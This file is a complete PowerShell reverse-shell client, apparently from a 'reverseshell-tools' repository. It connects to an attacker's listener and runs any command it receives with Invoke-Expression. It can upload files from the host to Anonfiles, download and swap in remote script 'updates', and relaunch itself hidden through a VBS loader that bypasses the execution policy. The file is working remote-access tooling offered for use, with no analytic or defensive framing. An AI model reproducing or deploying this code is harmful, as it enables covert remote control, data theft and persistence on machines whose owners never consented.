#v1.0

try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
catch
{
	New-Item "listener.txt" | ForEach-Object { Write-Host "Can't find listener.txt file, creating it..." }
	$server = ""
}
while ($server -in @($null, "")) { $server = Read-Host "Enter listener IP and Port! [x.x.x.x:xxxxx]"; Add-Content -Value $server -Path "listener.txt" }

Write-Host ("Connecting to " + $server.Replace("'", "").Replace(",", ":").Replace(" ", ""))

$server = $server.Split(":")
$ip = $server[0]
$port = $server[1]

while ($TCPClient.Connected -ne "True")
{
	Start-Sleep -Seconds 1
	try
	{
		Invoke-Expression ('$TCPClient' + "= New-Object Net.Sockets.TCPClient('$ip', $port)")
	}
	catch { }
}

Write-Host "Sucessfully Connected!"

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function InvokeCustomCommands ($Action)
{
	$SplitAction = $Action.Split()
	if ($Action -eq "help")
	{
		WriteToStream "
<optional> [necessary] (/ is or)

/exit - ends the connection
/restart - restarts the script
/upload [FileName] - uploads a file to Anonfiles
/download [Uri] [FileName] - downloads a file frome the web
/server <set [IP]> - shows or sets the listener server
/ver <list <git> / <update [FileName] / git [VersionName]> - shows advible or updates the client
"
	}
	#end connection
	if ($Action -eq "exit") { $StreamWriter.Close(); Exit 0 }
	
	#upload a file
	if ($SplitAction[0] -eq "upload")
	{
		function AnonUpload ($file)
		{
			cmd /c "curl -F "file=@$file" https://api.anonfiles.com/upload" | Select-String "full" -OutVariable filelink
			WriteToStream ("Download Here: " + ([string]$filelink).Replace('"full":', "").Replace("\/", "/").Replace('"', "").Replace(",", "").Substring(5))
		}
		$file = $SplitAction[1]
		if (((Test-Path $file) -eq $true) -and ((Get-Item $file).Extension -ne "")) { $file = (Get-Item $file).FullName; AnonUpload ($file) }
		else { WriteToStream "No Such File!" }
	}
	#download a file
	if ($SplitAction[0] -eq "download")
	{
		try { Invoke-WebRequest -Uri $SplitAction[1] -OutFile $SplitAction[2] }
		catch { WriteToStream "Error Downloading!" }
	}
	#edits the listener.txt file
	if ($SplitAction[0] -eq "server")
	{
		if ($SplitAction[1] -eq "set")
		{
			if ($SplitAction[2] -ne $null)
			{
				$server = $SplitAction[2]
				Clear-Content -Path "listener.txt"
				Add-Content -Value $server -Path "listener.txt"
				WriteToStream "Sucessfully Set Server!"
			}
			else { WriteToStream "Enter listener IP and Port! [x.x.x.x:xxxxx]" }
			
		}
		else
		{
			Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") | ForEach-Object { WriteToStream $_ }
		}
	}
	if ($SplitAction[0] -in @("version", "ver"))
	{
		if ($SplitAction[1] -eq "list")
		{
			if ($SplitAction[2] -eq "git")
			{
				(Invoke-RestMethod -Uri "https://api.github.com/repos/UltraAlex00/reverseshell-tools/contents/catalog") | Where-Object { $_.type -eq "file" } | Select-Object -ExpandProperty name | ForEach-Object { WriteToStream ([string]$_) -NoCommand }
				WriteToStream ' '
			}
			else
			{
				$files = Get-ChildItem *ps1
				foreach ($file in $files)
				{
					if ((Get-Content $file -TotalCount 1 -ErrorAction SilentlyContinue).Contains("#v"))
					{
						if ((Get-Item $file).FullName -eq $PSCommandPath) { $addactivetext = " - Currently Active" }
						WriteToStream ("Version " + (Get-Content $file -TotalCount 1).Replace("#v", "") + " - saved as $file$addactivetext`n") -NoCommand
					}
				}
				WriteToStream ' '
			}
		}
		if ($SplitAction[1] -eq "update")
		{
			function ApplyVersion ($VersionFile)
			{
				if ((Get-Item $VersionFile).Extension -eq ".ps1")
				{
					WriteToStream "Applying..." -NoCommand
					do { $RandomName = [string](Get-Random -Maximum 99999) + ".ps1" }
					while ((Get-ChildItem "*$RandomName") -ne $null)
					
					$oldname = $PSCommandPath
					Rename-Item -Path $PSCommandPath -NewName $RandomName -Force
					Rename-Item -Path $VersionFile -NewName $oldname
					WriteToStream "`n`nInstall Sucessfull!`nRestart To Apply Changes!`n"
					Remove-Item $VersionFile -ErrorAction SilentlyContinue
				}
				else { WriteToStream "`nError Applying Update!" }
			}
			if ($SplitAction[2].Contains("/"))
			{
				Set-Location ((Get-Item $PSCommandPath).DirectoryName)
				Remove-Item "update.ps1" -Force -ErrorAction SilentlyContinue
				WriteToStream "Downloading Update..." -NoCommand
				try
				{
					Invoke-WebRequest -Uri $SplitAction[2] -OutFile "update.ps1" -ErrorAction Stop
					ApplyVersion "update.ps1"
				}
				catch { WriteToStream "Failed to Update!" }
			}
			elseif ($SplitAction[2] -ne "git")
			{
				try
				{
					if ((Get-Item $SplitAction[2] -ErrorAction Stop).Extension -eq ".ps1")
					{
						Set-Location $PSCommandPath
						Remove-Item "update.ps1" -Force -ErrorAction SilentlyContinue
						Copy-Item (Get-Item $SplitAction[2]).FullName ((Get-Item $PSCommandPath).DirectoryName + "\update.ps1")
						ApplyVersion "update.ps1"
					}
					elseif ($SplitAction[2] -ne "git") { Write-Error "" }
				}
				catch { WriteToStream "Failed to Update!" }
			}
			if ($SplitAction[2] -eq "git")
			{
				$gituri = ("https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/catalog/" + ([string]$SplitAction[3 .. $SplitAction.Count]).Replace(" ", "%20") + ".ps1")
				try
				{
					Set-Location (Get-Item $PSCommandPath).DirectoryName
					Remove-Item "update.ps1" -Force -ErrorAction SilentlyContinue
					WriteToStream "Downloading Update..." -NoCommand
					Invoke-WebRequest -Uri $gituri -OutFile "update.ps1"
					ApplyVersion "update.ps1"
				}
				catch { WriteToStream "`n`nVersion Does Not Exitst!`n" }
			}
		}
		
		if ($SplitAction[1] -notin @("list", "update")) { WriteToStream ("`nVersion " + (Get-Content $PSCommandPath -TotalCount 1).Replace("#", "") + " saved as $PSCommandPath`n") }
	}
	if ($SplitAction[0] -eq "restart")
	{
		try { Get-Item (($PSCommandPath).DirectoryName + "\loader.vbs") -ErrorAction Stop }
		catch
		{
			$loaderbuilder = 'CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy bypass -file """ & CreateObject("WScript.Shell").CurrentDirectory & "\active.ps1""", 0'
			New-Item -Path ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs") -Value $loaderbuilder
		}
		try { Get-Item (($PSCommandPath).DirectoryName + "\loader.lnk") -ErrorAction Stop }
		catch
		{
			$loadershortcutbuilder = (New-Object -ComObject WScript.Shell).CreateShortcut((Get-Item $PSCommandPath).DirectoryName + "\loader.lnk")
			$loadershortcutbuilder.TargetPath = ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs")
			$loadershortcutbuilder.WorkingDirectory = (Get-Item $PSCommandPath).DirectoryName
			$loadershortcutbuilder.Save()
		}
		5 .. 1 | ForEach-Object { WriteToStream "Restarting in $_ s" -NoCommand; Start-Sleep 1 }
		explorer ((Get-Item $PSCommandPath).DirectoryName + "\loader.lnk")
		exit
	}
	
	
	if ($SplitAction[0] -notin @("help", "exit", "upload", "download", "server", "version", "ver", "restart")) { WriteToStream "Invalid Command!" }
}

function WriteToStream ([string]$String, [switch]$NoCommand)
{
	[byte[]]$script:Buffer = 0 .. $TCPClient.ReceiveBufferSize | ForEach-Object { 0 }
	
	if ($NoCommand)
	{
		$StreamWriter.Write("`n$String")
		$StreamWriter.Flush()
	}
	else
	{
		$StreamWriter.Write($String + "`n[DEEZ NUTS] > ")
		$StreamWriter.Flush()
	}
	Write-Host $String
}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
{
	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
	if ($Command.Substring(0, 1) -eq "/") { InvokeCustomCommands $Command.Substring(1) }
	else
	{
		$Output = try
		{
			Invoke-Expression $Command 2>&1 | Out-String
		}
		catch
		{
			$_ | Out-String
		}
		
		
		WriteToStream ($Output)
	}
}
$StreamWriter.Close()
Clear-Host